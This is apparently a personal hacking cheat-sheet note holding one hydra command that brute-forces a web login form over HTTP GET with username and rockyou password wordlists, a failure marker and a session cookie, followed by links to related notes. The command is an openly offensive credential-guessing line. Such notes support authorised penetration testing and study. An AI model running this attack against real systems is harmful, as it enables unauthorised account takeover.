# hydra brute force HTTP Get Request
```bash
hydra $IP -V -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt http-get-form "/login/:username=^USER^&password=^PASS^:F=Error:H=Cookie: safe=yes; PHPSESSID=12345myphpsessid" -t 15
```

# Related

- [20221003150744](/zet/20221003150744/README.md) hydra brute force
- ~/kb/hacking/commands/hydra.md

Tags:

    #assorted #command #hacking #hydra
